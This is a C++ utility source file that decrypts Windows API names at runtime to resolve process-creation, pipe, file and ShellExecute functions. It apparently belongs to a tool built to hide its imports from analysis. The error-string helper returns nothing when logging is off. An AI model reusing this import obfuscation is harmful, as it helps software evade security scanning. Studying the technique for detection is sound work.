#include <utils/utils.hpp>

#include <utils/log.hpp>
#include <utils/file.hpp>
#include <utils/win32_strings.hpp>
#include <utils/win32_symbols.hpp>

namespace utilities
{
	std::string
	win32_get_error_string(void)
	{
		#if LOG_ENABLED
			DWORD code = GetLastError();
			if (code == 0)
				return "No error";

			LPSTR buf = nullptr;
			DWORD len = FormatMessageA(
				FORMAT_MESSAGE_ALLOCATE_BUFFER | FORMAT_MESSAGE_FROM_SYSTEM | FORMAT_MESSAGE_IGNORE_INSERTS,
				nullptr,
				code,
				MAKELANGID(LANG_NEUTRAL, SUBLANG_DEFAULT),
				reinterpret_cast<LPSTR>(&buf),
				0,
				nullptr
			);

			std::string msg = buf ? std::string(buf, len) : "Unknown error";
			LocalFree(buf);

			return "Error " + std::to_string(code) + ": " + msg;
		#endif
	}

	int
	win32_load_module_functions(void)
	{
		/*          KERNEL32 Functions          */
		es_kernel32.decrypt();
		HMODULE h_kernel = GetModuleHandleA(es_kernel32._plain);
		if (h_kernel == NULL) {
			LOG_ERROR("[capture] Failed to get kernel32.dll with %s", utilities::win32_get_error_string().c_str());
		}

		// Module Operations
		fptr_LoadLibraryA = (LoadLibraryA_t)encryption::get_encrypted_function_name(
			es_load_library, h_kernel);

		// Process Operations
		fptr_CreatePipe = (CreatePipe_t)encryption::get_encrypted_function_name(
			es_createpipe, h_kernel);

		fptr_CreateProcessA = (CreateProcessA_t)encryption::get_encrypted_function_name(
			es_createprocess, h_kernel);

		// File Operations
		fptr_ReadFile = (ReadFile_t)encryption::get_encrypted_function_name(
			es_readfile, h_kernel);

		fptr_WriteFile = (WriteFile_t)encryption::get_encrypted_function_name(
			es_writefile, h_kernel);

		fptr_CreateFileA = (CreateFileA_t)encryption::get_encrypted_function_name(
			es_createfilea, h_kernel);

		// Filesystem Operations
		fptr_CreateDirectoryA = (CreateDirectoryA_t)encryption::get_encrypted_function_name(
			es_createdirectorya, h_kernel);

		fptr_SetCurrentDirectoryA = (SetCurrentDirectoryA_t)encryption::get_encrypted_function_name(
			es_setcurrentdirectorya, h_kernel);

		// System and File Retrievers
		fptr_GetFileAttributesA = (GetFileAttributesA_t)encryption::get_encrypted_function_name(
			es_getfileattributesa, h_kernel);

		fptr_GetModuleFileNameA = (GetModuleFileNameA_t)encryption::get_encrypted_function_name(
			es_getmodulefilenamea, h_kernel);

		fptr_GetEnvironmentVariableA = (GetEnvironmentVariableA_t)encryption::get_encrypted_function_name(
			es_getenvironmentvariablea, h_kernel);

		// Clean Up Operations
		fptr_CloseHandle = (CloseHandle_t)encryption::get_encrypted_function_name(
			es_closehandle, h_kernel);

		/*          SHELL32 Functions          */
		HMODULE h_shell32 = encryption::get_encrypted_module_name(es_shell32);

		// System Operations
		fptr_ShellExecuteA = (ShellExecuteA_t)encryption::get_encrypted_function_name(
			es_shellexecutea, h_shell32);

		return 0;
	}

	int
	win32_set_shell_to_current_directory()
	{
		CHAR cwd[MAX_PATH];
		if (!fptr_GetModuleFileNameA(NULL, cwd, MAX_PATH)) {
			LOG_FATAL("Failed to get the current working directory with %s", utilities::win32_get_error_string().c_str());

			return -1;
		}

		if (!file::path_clean(cwd)) {
			LOG_FATAL("Failed to clean the current working directory with %s", utilities::win32_get_error_string().c_str());

			return -1;
		}

		if (!fptr_SetCurrentDirectoryA(cwd)) {
			LOG_FATAL("Failed to set the current working directory with %s", utilities::win32_get_error_string().c_str());

			return -1;
		}

		return 0;
	}
}